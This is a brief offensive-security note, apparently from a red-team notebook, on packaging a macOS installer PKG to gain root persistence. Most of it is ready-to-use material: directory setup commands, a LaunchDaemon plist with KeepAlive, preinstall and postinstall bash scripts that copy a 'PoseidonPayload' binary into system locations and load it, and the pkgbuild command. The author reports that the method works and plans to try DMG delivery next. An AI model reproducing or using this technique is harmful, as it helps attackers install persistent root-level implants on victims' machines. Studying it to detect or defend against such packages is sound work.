### PKG
Installer PKG, persistence at root

Create installer structure:

```
mkdir scripts  
mkdir scripts/files  
touch scripts/preinstall  
touch scripts/postinstall  
chmod +x scripts/preinstall  
chmod +x scripts/postinstall
```

 make your pre and postinstall scripts executable before packaging 

Create Plist to register as launch daemon

```
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">  
<plist version="1.0">  
<dict>  
<key>Label</key>  
<string>com.examplepayload.persistence</string>  
<key>ProgramArguments</key>  
<array>  
<string>/Library/Application Support/PoseidonPayload</string>  
</array>  
<key>KeepAlive</key>  
<true/>  
</dict>  
</plist>
```

Move plist and universal binary into correct locations
`scripts/files/com.examplepayload.persistence.plist` 
`scripts/files/PoseidonPayload`


Pre and Post install scripts have rules
They are likeregular bash scripts, however, they must start with `#!/bin/bash` and end with `exit 0` .
Pre

```
#!/bin/bash  
cp files/PoseidonPayload "/Library/Application Support/PoseidonPayload"  
cp files/com.examplepayload.persistence.plist "/Library/LaunchDaemons/com.examplepayload.persistence.plist"  
exit 0
```
Post
```
#!/bin/bash  
launchctl load "/Library/LaunchDaemons/com.examplepayload.persistence.plist"  
exit 0
```
pkg build
```
pkgbuild --identifier <identifier> --nopayload --scripts <path to scripts folder> <output>.pkg
```

Ended up working, gets root but also requires allowing on latest macos
Do DMG to see if it also is locked down!
